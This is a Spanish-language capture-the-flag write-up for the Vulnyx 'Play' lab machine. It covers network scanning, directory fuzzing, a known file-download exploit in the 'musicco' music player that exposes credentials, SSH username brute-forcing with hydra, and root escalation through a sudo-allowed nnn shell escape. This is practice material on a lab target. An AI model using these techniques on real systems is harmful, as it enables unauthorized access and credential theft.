
# Vulnyx Play

```bash
arp-scan -I eth0 --localnet
(IP-victima)
```

```bash
nmap -p 22,80 -sS -sC -sV -n -Pn (IP-victima) -oN nmap
```
- 22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
- 80/tcp open  http    Apache httpd 2.4.56 ((Debian))

Dentro del puerto 80, efectivamente encontramos un servidor Apache. Haremos fuzzing para ver qué más encontramos.

```bash
wfuzz --hc=404 -u http://(IP-victima)/FUZZ -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
```
- /playlist

Dentro de `http://(IP-victima)/playlist` encontramos una especie de reproductor de música, investigando un poco más encontramos que esto que vemos es un software llamado "musicco". Por lo tanto, buscaremos algún exploit para este software. Encontramos el siguiente exploit:

[https://www.exploit-db.com/exploits/45830](https://www.exploit-db.com/exploits/45830)

El cual nos permitirá descargar archivos dentro del programa. Podemos tener suerte y descargar alguna información delicada.

```bash
http://localhost/[PATH]/?getAlbum&parent=[Directory]&album=Efe
```

Para saber cuál es el directorio que tenemos que atacar usaremos wfuzz.

```bash
wfuzz --hc=404 --hl=0 -u 'http://(IP-victima)/playlist/?getAlbum&parent=FUZZ&album=Efe' -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
```
- app
- lib
- theme
- temp

Al ejecutar:
```bash
http://(IP-victima)/playlist/?getAlbum&parent=app&album=Efe
```

Descargamos un archivo .zip. Al descomprimirlo encontramos un archivo llamado "config.php". Al leerlo encontramos unos posibles usuarios y contraseñas.

- array('admin', 'admin', 'true')
- array('guest', 'guest', 'false')
- array('unknown', 'iL0v3Mu$1c', 'false')

Al intentar ingresar vía SSH no nos permite con ninguno de los dos usuarios. Así que al tener una contraseña que parece correcta intentaremos hacer fuerza bruta de usuarios con esa contraseña válida a ver qué pasa.

```bash
hydra -L /home/kali/wordlists666/names.txt -p 'i********c' ssh://(IP-victima)
```
- [22][ssh] host: (IP-victima)   login: andy   password: i*********c

Ahora ingresamos vía SSH:
```bash
ssh andy@(IP-victima)
Pass: i***********c
```

```bash
whoami
andy
```

```bash
sudo -l
(root) NOPASSWD: /usr/bin/nnn
```

Al ejecutarlo como root, nos abre un menú. Al interactuar colocando "!" nos da directamente una consola como root. :D
